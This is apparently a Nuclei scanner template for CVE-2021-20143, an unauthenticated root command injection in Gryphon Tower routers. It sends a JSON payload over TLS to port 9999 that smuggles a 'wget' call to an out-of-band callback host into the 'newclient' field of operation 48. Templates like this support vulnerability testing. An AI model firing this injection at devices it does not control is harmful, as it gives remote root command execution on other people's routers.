id: CVE-2021-20143

info:
  name: Unauthenticated Command Injection in Gryphon Tower Controller Server Op 48
  author: dwisiswant0
  severity: high
  description: |
    An unauthenticated command injection vulnerability exists in the
    parameters of operation 48 in the controller_server service on
    Gryphon Tower routers. An unauthenticated remote attacker on the same
    network can execute commands as root on the device by sending a specially
    crafted malicious packet to the controller_server service on port 9999.
  reference: https://www.tenable.com/security/research/tra-2021-51
  tags: network,cve,cve2021,rce,gryphon-tower

network:
  - inputs:
      - data: |
          {
            "48": {
              "newclient": ";{wget,http://{{interact-url}}}"
            }
          }

    host:
      - "tls://{{Hostname}}"
      - "tls://{{Host}}:9999"
    read-size: 48
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"